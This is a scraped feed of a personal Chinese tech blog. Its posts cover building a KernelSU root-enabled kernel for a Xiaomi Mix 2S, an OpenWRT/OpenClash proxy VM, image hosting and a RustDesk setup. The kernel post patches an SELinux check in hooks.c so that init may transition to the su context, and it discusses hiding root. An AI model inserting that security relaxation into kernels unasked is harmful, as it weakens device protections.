./arch/arm64/configs/vendor/xiaomi/polaris_defconfig</span><br><span class="line">echo &quot;CONFIG_LZ4_COMPRESS=y&quot; &gt;&gt; ./arch/arm64/configs/vendor/xiaomi/polaris_defconfig</span><br><span class="line">echo &quot;CONFIG_LZ4_DECOMPRESS=y&quot; &gt;&gt; ./arch/arm64/configs/vendor/xiaomi/polaris_defconfig</span><br><span class="line"></span><br><span class="line">cat ./arch/arm64/configs/vendor/xiaomi/polaris.config &gt;&gt; ./arch/arm64/configs/vendor/xiaomi/polaris_defconfig</span><br></pre></td></tr></table></figure></li><li><p>开始编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make O=out ARCH=arm64 vendor/xiaomi/polaris_defconfig</span><br><span class="line"></span><br><span class="line">make -j$(nproc --all) O=out CC=clang ARCH=arm64 CLANG_TRIPLE=aarch64-linux-gnu- CROSS_COMPILE=/home/runner/gcc_aarch64/bin/aarch64-linux-android- CROSS_COMPILE_ARM32=/home/runner/gcc_arm/bin/arm-linux-androideabi- AR=llvm-ar NM=llvm-nm OBJCOPY=llvm-objcopy OBJDUMP=llvm-objdump STRIP=llvm-strip LLVM_IAS=1 LLVM=1</span><br></pre></td></tr></table></figure></li><li><p>使用AnyKernel3进行打包。完成后会在<code>/home/runner/android_kernel_xiaomi_sdm845</code>下产生一个<code>AnyKernel3.zip</code>文件，拿这个卡刷就行了。（注意准备好救砖工具，备份好boot分区）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone --recursive --depth=1 -j $(nproc) --branch polaris https://github.com/Shuery-Shuai/AnyKernel3.git AnyKernel3</span><br><span class="line"></span><br><span class="line">cp out/arch/arm64/boot/Image AnyKernel3/</span><br><span class="line">cp out/arch/arm64/boot/Image.gz AnyKernel3/</span><br><span class="line">cp out/arch/arm64/boot/Image.gz-dtb AnyKernel3/</span><br><span class="line">cd /home/runner/android_kernel_xiaomi_sdm845/AnyKernel3</span><br><span class="line">zip -r ../AnyKernel3.zip *</span><br></pre></td></tr></table></figure></li></ul><h2 id="出现的bug以及解决方法"><a href="#出现的bug以及解决方法" class="headerlink" title="出现的bug以及解决方法"></a>出现的bug以及解决方法</h2><h3 id="刷入模块没有效果"><a href="#刷入模块没有效果" class="headerlink" title="刷入模块没有效果"></a>刷入模块没有效果</h3><ul><li>具体表现为ksu内核编译正常，刷入有su权限，但是模块刷入重启后仍未灰色。解决方法见[参考文章](#[Bug修复指南]对于旧内核KernelSU不工作以及模块功能失效问题的部分解决方案 #956)。具体表现为<code>security/selinux/hooks.c</code>这个文件的修改。</li></ul><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ul><li><p>找到<code>security/selinux/hooks.c</code>文件，打开后找到<code>static int check_nnp_nosuid</code>这个函数。</p></li><li><p>将</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">static int check_nnp_nosuid(const struct linux_binprm *bprm,</span><br><span class="line">    const struct task_security_struct *old_tsec,</span><br><span class="line">    const struct task_security_struct *new_tsec)</span><br><span class="line">&#123;</span><br><span class="line">int nnp = (bprm-&gt;unsafe &amp; LSM_UNSAFE_NO_NEW_PRIVS);</span><br><span class="line">int nosuid = (bprm-&gt;file-&gt;f_path.mnt-&gt;mnt_flags &amp; MNT_NOSUID);</span><br><span class="line">int rc;</span><br><span class="line"></span><br><span class="line">if (!nnp &amp;&amp; !nosuid)</span><br><span class="line">return 0; /* neither NNP nor nosuid */</span><br><span class="line"></span><br><span class="line">if (new_tsec-&gt;sid == old_tsec-&gt;sid)</span><br><span class="line">return 0; /* No change in credentials */</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * The only transitions we permit under NNP or nosuid</span><br><span class="line"> * are transitions to bounded SIDs, i.e. SIDs that are</span><br></pre></td></tr></table></figure></li><li><p>改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">static int check_nnp_nosuid(const struct linux_binprm *bprm,</span><br><span class="line">    const struct task_security_struct *old_tsec,</span><br><span class="line">    const struct task_security_struct *new_tsec)</span><br><span class="line">&#123;</span><br><span class="line">static u32 ksu_sid;</span><br><span class="line">char *secdata;</span><br><span class="line">int nnp = (bprm-&gt;unsafe &amp; LSM_UNSAFE_NO_NEW_PRIVS);</span><br><span class="line">int nosuid = (bprm-&gt;file-&gt;f_path.mnt-&gt;mnt_flags &amp; MNT_NOSUID);</span><br><span class="line">int rc, error;</span><br><span class="line">u32 seclen;</span><br><span class="line"></span><br><span class="line">if (!nnp &amp;&amp; !nosuid)</span><br><span class="line">return 0; /* neither NNP nor nosuid */</span><br><span class="line"></span><br><span class="line">if (new_tsec-&gt;sid == old_tsec-&gt;sid)</span><br><span class="line">return 0; /* No change in credentials */</span><br><span class="line"></span><br><span class="line">if (!ksu_sid)</span><br><span class="line">security_secctx_to_secid(&quot;u:r:su:s0&quot;, strlen(&quot;u:r:su:s0&quot;), &amp;ksu_sid);</span><br><span class="line">error = security_secid_to_secctx(old_tsec-&gt;sid, &amp;secdata, &amp;seclen);</span><br><span class="line">if (!error) &#123;</span><br><span class="line">rc = strcmp(&quot;u:r:init:s0&quot;, secdata);</span><br><span class="line">security_release_secctx(secdata, seclen);</span><br><span class="line">if (rc == 0 &amp;&amp; new_tsec-&gt;sid == ksu_sid)</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line"> * The only transitions we permit under NNP or nosuid</span><br><span class="line"> * are transitions to bounded SIDs, i.e. SIDs that are</span><br></pre></td></tr></table></figure></li><li><p>改好保存重新编译。</p></li></ul><h3 id="ksu无法卸载模块"><a href="#ksu无法卸载模块" class="headerlink" title="ksu无法卸载模块"></a>ksu无法卸载模块</h3><ul><li>解决方法见<a href="#%E4%B8%BAnon-gki%E9%9B%86%E6%88%90ksu_kernelsu%E5%AE%98%E6%96%B9%E6%95%99%E7%A8%8B">官方教程</a>。具体表现为修改<code>fs/namespace.c</code>这个文件。步骤与上个类似，<code>-</code>为需要删除的行，<code>+</code>为需要添加的行。</li></ul><h2 id="编译好的内核"><a href="#编译好的内核" class="headerlink" title="编译好的内核"></a>编译好的内核</h2><ul><li>注意准备好救砖工具，备份好boot分区。仅作为学习分享，造成的后果与本人无关。</li><li><a href="https://frp-any.top:18514/Onedrive/%E5%88%B7%E6%9C%BA%E5%B7%A5%E5%85%B7/MIX2s/%E5%86%85%E6%A0%B8/AnyKernel3_by-me-test3-lz4.zip">仅增加支持lz4的内核</a></li><li><a href="https://frp-any.top:18514/Onedrive/%E5%88%B7%E6%9C%BA%E5%B7%A5%E5%85%B7/MIX2s/%E5%86%85%E6%A0%B8/AnyKernel3_by-me-test5-bug.zip">增加了lz4和ksu支持的内核</a></li></ul><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><ul><li>可能是我自己的问题，在crd上的隐藏效果一直一般，包括这次的ksu。而且因为mix2s内核老旧，一部分新的特性也无法体验到，确实还不一定有magisk好用。毕竟magisk拥有相当数量的模块可以使用，而ksu需要等别人适配（也许是越更新越不适配）。</li></ul><h2 id="参考文章和源码仓库"><a href="#参考文章和源码仓库" class="headerlink" title="参考文章和源码仓库"></a>参考文章和源码仓库</h2><ul><li>包含文中所链接的文章与仓库<blockquote><ul><li><a href="https://github.com/feichaixiaobai/Android-kernel-make-teach/discussions/1">Android内核编译教程_feichaixiaobai</a></li><li><a href="https://github.com/Initsnow/kernelsu_xiaomi_polaris_action">Mix2s内核ksu编译action_Initsnow</a></li><li><a href="https://minetest.top/archives/1701313670575">Android 自定义系统编译_青雨染蓑衣的个人小站 </a></li><li><a href="https://github.com/tiann/KernelSU/discussions/956">[Bug修复指南]对于旧内核KernelSU不工作以及模块功能失效问题的部分解决方案 #956</a></li><li><a href="https://github.com/ferstar/xiaomi_xaga_kernel">Kernel Source For PocoX4-GT&#x2F;RedmiK50i&#x2F;Note11tpro_ferstar</a></li><li><a href="https://blog.csdn.net/Qwertyuiop2016/article/details/130476079">为一加七Pro(LineageOs17.1 4.14内核版本)编译KernelSu_Qwertyuiop2016</a></li><li><a href="https://kernelsu.org/zh_CN/guide/how-to-integrate-for-non-gki.html">为non-gki集成ksu_kernelsu官方教程</a></li></ul></blockquote></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;看到隔壁用kernelsu（以下简称ksu）隐藏root的效果不错，但mix2s的4.9内核显然不在ksu的官方支持范围内，需要</summary>
      
    
    
    
    <category term="日常" scheme="http://wu1015.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="刷机" scheme="http://wu1015.github.io/tags/%E5%88%B7%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>使用vbox和OpenWRT实现优雅的代理上网</title>
    <link href="http://wu1015.github.io/2025/02/01/vbox-proxy-openwrt/"/>
    <id>http://wu1015.github.io/2025/02/01/vbox-proxy-openwrt/</id>
    <published>2025-02-01T04:47:36.000Z</published>
    <updated>2025-02-01T04:53:30.075Z</updated>
    
    <content type="html"><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><ul><li>因为使用的 Linux 作为主力机，而在 Linux 上并没有一个为系统代理的东西。虽然修改环境变量能实现部分应用的代理，但总归还是太麻烦了。特别是用 docker 拉镜像的时候，只能用第三方应用下好再导入，费时费力。</li><li>至于为什么用 vbox 而不是 VM 。因为我这 VM 在<a href="https://wu1015.github.io/2024/04/12/ReinstallVmwareHostModules/">解决Ubuntu升级内核导致的无法安装VMware模块问题</a>后玄学断网，我也懒得弄了。</li></ul><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="配置OpenWRT镜像"><a href="#配置OpenWRT镜像" class="headerlink" title="配置OpenWRT镜像"></a>配置OpenWRT镜像</h3><ul><li><p><a href="https://downloads.openwrt.org/releases/23.05.5/targets/x86/64/">官网</a>下载镜像。根据需求下载，我一般下载的是<code>generic-ext4-combined-efi.img.gz</code>。</p></li><li><p>下载完后解压，得到<code>openwrt-23.05.5-x86-64-generic-ext4-combined-efi.img</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -d openwrt-23.05.5-x86-64-generic-ext4-combined-efi.img.gz</span><br></pre></td></tr></table></figure></li><li><p>转化为 VDI</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vboxmanage convertfromraw --format VDI openwrt-23.05.5-x86-64-generic-ext4-combined-efi.img openwrt-23.05.5-x86-64-generic-ext4-combined-efi.vdi</span><br></pre></td></tr></table></figure></li><li><p>进入 vbox，<code>管理/工具/虚拟介质管理</code>中注册刚刚转化的 VDI 文件。（后续可在此修改大小）</p></li><li><p>新建虚拟电脑。虚拟硬盘选择刚刚注册的。</p></li></ul><h3 id="配置OpenWRT的网络"><a href="#配置OpenWRT的网络" class="headerlink" title="配置OpenWRT的网络"></a>配置OpenWRT的网络</h3><ul><li><p>安装完之后在 vbox 中设置网络为桥接网卡</p></li><li><p>进入虚拟机后设置网络为自己电脑所在网段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/config/network</span><br></pre></td></tr></table></figure></li><li><p>显示内容如下（不用管其他的直接改<code>ipaddr</code>就行了）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config interface &#x27;lan&#x27;</span><br><span class="line">option device &#x27;br-lan&#x27;</span><br><span class="line">option proto &#x27;static&#x27;</span><br><span class="line">option ipaddr &#x27;192.168.1.1&#x27;</span><br><span class="line">option netmask &#x27;255.255.255.0&#x27;</span><br><span class="line">option ip6assign &#x27;60&#x27;</span><br></pre></td></tr></table></figure></li><li><p>修改完保存重启虚拟机。之后就可以通过修改后的ip访问openWRT的后台了。（默认帐号密码一般是root password）</p></li></ul><h3 id="进行网络配置"><a href="#进行网络配置" class="headerlink" title="进行网络配置"></a>进行网络配置</h3><ul><li><p>输入openwrt的ip进入管理页面，然后到网络那设置一个wan口。选择DHCP，设备选择<code>eth0</code>。</p></li><li><p>然后修改lan的<code>dns、网关</code>等信息，保证与真机一致。保存应用后就可以上网了。</p></li><li><p>或者直接修改配置文件<code>/etc/config/network</code>中的内容如下（最好去管理页面那设置，直接修改配置文件好像会出问题）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">config interface &#x27;lan&#x27;</span><br><span class="line">option device &#x27;br-lan&#x27;</span><br><span class="line">option proto &#x27;static&#x27;</span><br><span class="line">option ipaddr &#x27;空闲的ip&#x27;</span><br><span class="line">option netmask &#x27;真机的子网掩码&#x27;</span><br><span class="line">option option ip6assign &#x27;60&#x27;</span><br><span class="line">option gateway &#x27;真机的网关地址&#x27;</span><br><span class="line">list dns &#x27;真机网络的DNS&#x27;</span><br><span class="line"></span><br><span class="line">config interface  &#x27;wan&#x27;</span><br><span class="line">option proto &#x27;dhcp&#x27;</span><br><span class="line">option device &#x27;eth0&#x27;</span><br></pre></td></tr></table></figure></li></ul><h3 id="网络代理的配置"><a href="#网络代理的配置" class="headerlink" title="网络代理的配置"></a>网络代理的配置</h3><ul><li><p>输入<code>passwd</code>设置密码，然后通过 ssh 连接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@刚刚设置的ip</span><br></pre></td></tr></table></figure></li><li><p>换源，参考<a href="https://mirrors.tuna.tsinghua.edu.cn/help/openwrt/">清华源</a>。</p></li><li><p><code>OpenClash</code>依赖的是<code>dnsmasq-full</code>，所以需要移除默认的<code>dnsmasq</code>，否则会导致<code>OpenClash</code>安装失败</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opkg remove dnsmasq &amp;&amp; opkg install dnsmasq-full</span><br></pre></td></tr></table></figure></li><li><p>下载OpenClash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/vernesong/OpenClash/releases/download/v0.46.050-beta/luci-app-openclash_0.46.050-beta_all.ipk -O openclash.ipk</span><br></pre></td></tr></table></figure></li><li><p>网络不畅可自己挂梯子下到本机然后上传。<br><img src="https://wu1015-images.pages.dev/imgs/vbox-proxy-openwrt/1.png" alt="上传 OpenClash 应用包"></p></li><li><p>添加<code>luci-compact</code>并重启，否则会提示进入 luci 页面错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opkg install luci luci-base luci-compat</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure></li><li><p>然后就可以在<code>Services/OpenClash</code>看到了。之后就是按照图形化的提示配置了。<br><img src="https://wu1015-images.pages.dev/imgs/vbox-proxy-openwrt/2.png" alt="配置 OpenCLash"></p></li><li><p>配置完后 OpenWRT 会没有网络。</p></li></ul><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ul><li><p>因为我只是单纯的自己用所以直接在网络设置中修改网关的地址为 OpenWRT 的地址就可以了。（注意不要设置动态MAC）</p></li><li><p>局域网设备同理，如果可以访问 OpenWRT 地址但无法上网的话，应该是路由转发没开。查询命令（Ubuntu）如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw status verbose</span><br></pre></td></tr></table></figure></li><li><p>开启路由转发（允许所有路由流量）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw default allow routed</span><br></pre></td></tr></table></figure></li><li><p>关闭路由转发（默认拒绝所有路由流量）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw default deny routed</span><br></pre></td></tr></table></figure></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote><p><a href="https://www.overcch.com/posts/virtual-openwrt">虚拟 openwrt</a><br><a href="https://easonyang.com/posts/transparent-proxy-in-router-gateway/">旁路由的原理与配置一文通</a><br><a href="https://blog.zilch40.wang/post/install-openwrt-in-vm-as-gateway/">折腾虚拟机里的OpenWrt做代理用网关</a><br><a href="https://mrdoc.fun/doc/425/">VirtualBox虚拟机安装openwrt供本机使用</a><br><a href="https://blog.hellowood.dev/posts/openwrt-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8-openclash/">OpenWrt安装使用OpenClash</a><br><a href="https://www.cnblogs.com/litifeng/p/16400431.html">在 VirtualBox VM 中安装 OpenWRT</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;需求&quot;&gt;&lt;a href=&quot;#需求&quot; class=&quot;headerlink&quot; title=&quot;需求&quot;&gt;&lt;/a&gt;需求&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;因为使用的 Linux 作为主力机，而在 Linux 上并没有一个为系统代理的东西。虽然修改环境变量能实现部分应用的代理，但总归</summary>
      
    
    
    
    <category term="日常" scheme="http://wu1015.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="Linux" scheme="http://wu1015.github.io/tags/Linux/"/>
    
    <category term="OpenWRT" scheme="http://wu1015.github.io/tags/OpenWRT/"/>
    
    <category term="VirtualBox" scheme="http://wu1015.github.io/tags/VirtualBox/"/>
    
  </entry>
  
  <entry>
    <title>QQ收藏无法作为图床使用</title>
    <link href="http://wu1015.github.io/2024/12/23/QQMarkFailed/"/>
    <id>http://wu1015.github.io/2024/12/23/QQMarkFailed/</id>
    <published>2024-12-23T03:26:08.000Z</published>
    <updated>2024-12-23T03:47:26.024Z</updated>
    
    <content type="html"><![CDATA[<h2 id="QQ开始限制外链访问"><a href="#QQ开始限制外链访问" class="headerlink" title="QQ开始限制外链访问"></a>QQ开始限制外链访问</h2><ul><li>2024.12.19的时候发现QQ开始限制QQ收藏图片的外链访问了。最开始是刷新下就能显示，但后面就不行了。<br><img src="https://wu1015-images.pages.dev/imgs/QQMarkFailed/001.png" alt="引用的QQ收藏图片无法显示"></li></ul><h2 id="存储在别人的图床"><a href="#存储在别人的图床" class="headerlink" title="存储在别人的图床"></a>存储在别人的图床</h2><ul><li>私有图床，没准哪天就跑路了，付费的咱们又那闲钱买。</li></ul><h2 id="使用其他的平替"><a href="#使用其他的平替" class="headerlink" title="使用其他的平替"></a>使用其他的平替</h2><ul><li>比如CSDN，微博之类的。但是因为这样需要注册账户，然后出来的外链图片没准还被压缩了。最后就是和前几个一样的问题，没准哪天就停止外链访问了呢。</li></ul><h2 id="自己搭建图床"><a href="#自己搭建图床" class="headerlink" title="自己搭建图床"></a>自己搭建图床</h2><ul><li>这个方案倒是不错，只是如果使用服务器来搭建有被d的风险。如果是用CF之类的免费Work服务来搭建，但其实也是有上限的，而且我也不需要那么完善的服务，只要能引用图片外链就行了（否则我也不会那么长时间的使用QQ收藏作为图床）。</li></ul><h3 id="使用CloudFlare-Page"><a href="#使用CloudFlare-Page" class="headerlink" title="使用CloudFlare Page"></a>使用CloudFlare Page</h3><ul><li>在Github上面新建一个仓库用于存储图片，然后用CF连接部署下就行了。（就和部署正常博客一样）</li><li>因为我需要预览下图片，而且也懒得一个个的打开，所以写了一个小的Py脚本来生成html文件，用于预览。虽然挺简陋的，但是能用就行（<a href="https://github.com/wu1015/images">仓库链接</a>）。<img src="https://wu1015-images.pages.dev/imgs/QQMarkFailed/002.png" alt="效果图"></li><li>仓库大小有5G好像，自己用的话应该是够用很长一段时间的。</li><li>完成，感觉还是不错的，只是速度相比于qq收藏还是稍微慢了点。但白嫖的要什么自行车。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;QQ开始限制外链访问&quot;&gt;&lt;a href=&quot;#QQ开始限制外链访问&quot; class=&quot;headerlink&quot; title=&quot;QQ开始限制外链访问&quot;&gt;&lt;/a&gt;QQ开始限制外链访问&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;2024.12.19的时候发现QQ开始限制QQ收藏图片的外链访问</summary>
      
    
    
    
    <category term="日常" scheme="http://wu1015.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="图床" scheme="http://wu1015.github.io/tags/%E5%9B%BE%E5%BA%8A/"/>
    
  </entry>
  
  <entry>
    <title>Rustdesk-Nginx-Err</title>
    <link href="http://wu1015.github.io/2024/10/03/Rustdesk-Nginx-Err/"/>
    <id>http://wu1015.github.io/2024/10/03/Rustdesk-Nginx-Err/</id>
    <published>2024-10-03T08:50:32.000Z</published>
    <updated>2024-12-23T02:28:02.683Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li>这是一次失败的配置，主要是因为需求和实际冲突了。</li><li>需求：部署在内网服务器，通过Nginx反代到内网穿透的一个端口进行访问</li><li>实际：rustdesk不支持端口后加地址，而我也不想再花钱买更多的隧道服务（免费用户仅支持两条隧道）</li></ul><h2 id="配置Rustdesk"><a href="#配置Rustdesk" class="headerlink" title="配置Rustdesk"></a>配置Rustdesk</h2><ul><li><p>下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/rustdesk/rustdesk-server/releases/download/1.1.11-1/rustdesk-server-linux-arm64v8.zip</span><br></pre></td></tr></table></figure></li><li><p>解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">7z x rustdesk-server-linux-arm64v8</span><br><span class="line"></span><br><span class="line">cd arm64v8</span><br></pre></td></tr></table></figure></li><li><p>添加执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x hbbr</span><br><span class="line">chmod +x hbbs</span><br></pre></td></tr></table></figure></li><li><p>此时只需要执行这两个执行文件就可以开启rustdesk服务了。但这并不太方便，所以需要编写一下启动脚本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim start_rustdesk.sh</span><br></pre></td></tr></table></figure></li><li><p>输入以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">地址/hbbr -r 0.0.0.0&amp;</span><br><span class="line">地址/hbbs -r 0.0.0.0&amp;</span><br><span class="line">wait</span><br></pre></td></tr></table></figure></li><li><p>添加启动权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x start_rustdesk.sh</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/systemd/system/rustdesk.service</span><br></pre></td></tr></table></figure><ul><li><p>输入以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Rustdesk Service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">ExecStart=/地址/start_rustdesk.sh</span><br><span class="line">KillMode=control-group</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></li><li><p>重新加载配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br></pre></td></tr></table></figure></li><li><p>启动服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start rustdesk</span><br></pre></td></tr></table></figure></li></ul><h2 id="使用Nginx进行反代（失败）"><a href="#使用Nginx进行反代（失败）" class="headerlink" title="使用Nginx进行反代（失败）"></a>使用Nginx进行反代（失败）</h2><ul><li><p>编辑配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br><span class="line"></span><br><span class="line"># 加入以下内容</span><br><span class="line"> location /rustdeska/ &#123;</span><br><span class="line">    proxy_pass http://127.0.0.1:21115;</span><br><span class="line">    proxy_set_header Host $host;</span><br><span class="line">    proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line"> &#125;</span><br><span class="line"> location /rustdeskb/ &#123;</span><br><span class="line">    proxy_pass http://127.0.0.1:21116;</span><br><span class="line">    proxy_set_header Host $host;</span><br><span class="line">    proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li><li><p>保存后校验并重启nginx服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nginx -t</span><br><span class="line"></span><br><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure></li></ul><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><ul><li>简单来说就是Rustdesk不支持端口后面加地址，比如这样的<code>https://abc:123/abc</code>，只支持这样的<code>https://abc:123</code>或者<code>abc:123</code>之类的。</li></ul><h2 id="用sealos进行配置"><a href="#用sealos进行配置" class="headerlink" title="用sealos进行配置"></a>用sealos进行配置</h2><ul><li>在即将打算不弄了的时候突然发现rustdesk的公用服务器在2024年4月关闭了对大陆的服务，理由是诈骗分子的过于猖獗。</li><li>而在搜索关闭服务的文章的时候发现了这篇博文提到的使用sealos进行配置<a href="https://www.cnblogs.com/ryanyangcs/p/18186163">RustDesk 自建服务器部署和使用教程</a>。一下就来了兴趣，稍微查了下感觉还行就直接用github帐号登录注册了一下。</li></ul><h3 id="关于sealos"><a href="#关于sealos" class="headerlink" title="关于sealos"></a>关于sealos</h3><ul><li>怎么来的我也就不过多赘述了，毕竟大伙都能查到。我就说说页面吧。</li><li>注册之后直接就能看到主页面，十分简洁，而且注册新用户有5g的试用金，这个好像是一比一充值的，充128以上有优惠。<br><img src="https://wu1015-images.pages.dev/imgs/Rustdesk-Nginx-Err/%E6%88%AA%E5%9B%BE_2024-09-27_16-23-40.png" alt="主界面图片"></li><li>另外默认是国外的服务器，使用国内的服务器在价格上看好像会便宜一点（反正那是这么标价的），不过需要实名认证。<br><img 